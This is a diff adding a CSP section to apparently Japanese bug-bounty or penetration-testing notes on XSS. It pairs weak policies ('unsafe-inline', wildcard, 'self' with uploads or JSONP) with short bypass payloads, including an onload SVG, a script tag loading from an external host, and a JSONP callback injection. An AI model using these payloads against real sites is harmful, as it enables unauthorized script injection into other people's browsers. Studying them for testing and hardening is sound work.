@@ -112,6 +112,60 @@ https://brutelogic.com.br/blog/xss-with-hoisting/
 Reactであればapp.jsが/に相当するため、setting.jsにアクセスすれな/settingに入れたりする
 https://www.bugbountyhunter.com/guides/?type=javascript_files
 
+
+
+### CSP
+
+#### 安全でないCSPの設定
+
+```
+安全でないインライン
+ポリシー例:
+script-src 'unsafe-inline';
+
+バイパス例:
+<svg onload=alert(1)>
+
+
+
+
+
+*(ワイルドカード)を使用した脆弱性
+特定のディレクティブの任意のソースが許可されることを意味する
+
+ポリシー例:
+script-src *;
+バイパスの例:
+<script src=//x55.is></script>
+
+
+
+
+selfをした脆弱性
+script-srcディレクティブのselfは、
+・JavaScriptコードを含むアップロードされたファイルをスクリプトソースとして使用する。
+
+ポリシー例:
+script-src 'self';
+バイパスの例:
+<script src=/uploads/myfile.js></script>
+
+・相対URLからのJSONPコールバックをスクリプトのソースとして使用する
+ポリシーの例
+script-src 'self';
+バイパスの例:
+<script src=/api/v1?callback=alert(1)></script>
+
+
+```
+
+
+
+
+
+
+
+
 ### HTML反映テスト
 シンプルだけど強力
 test<h2>test1
